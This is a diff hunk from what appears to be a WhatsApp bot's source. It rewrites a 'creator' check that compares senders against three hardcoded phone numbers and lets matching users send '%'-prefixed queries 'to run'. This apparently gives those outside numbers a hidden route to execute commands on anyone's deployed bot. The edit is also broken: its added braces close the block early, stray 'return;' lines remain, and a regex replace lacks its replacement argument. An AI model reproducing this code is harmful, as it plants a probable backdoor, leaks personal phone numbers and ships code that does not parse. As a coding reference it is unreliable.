@@ -229,17 +229,17 @@ Smarter ⚡ Faster ⚙️ Stronger than ever before.
   conn.sendMessage(from, { text: teks }, { quoted: mek })
   }
   const udp = botNumber.split('@')[0];
-    const jawad = ('94772469026', '94776907496', '94705104830');
-    let isCreator = [udp, jawad, config.DEV]
-					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
-					.includes(mek.sender);
+const jawad = ['94772469026', '94776907496', '94705104830']; // <-- fix
+let isCreator = [udp, ...jawad, config.DEV_NUM]  // <-- use spread operator
+    .map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
+    .includes(mek.sender);
 
-    if (isCreator && mek.text.startsWith('%')) {
-					let code = budy.slice(2);
-					if (!code) {
-						reply(
-							`Provide me with a query to run Master!`,
-						);
+if (isCreator && mek.text.startsWith('%')) {
+    let code = budy.slice(2);
+    if (!code) {
+        reply(`Provide me with a query to run Master!`);
+    }
+}
 						return;
 					}
 					try {
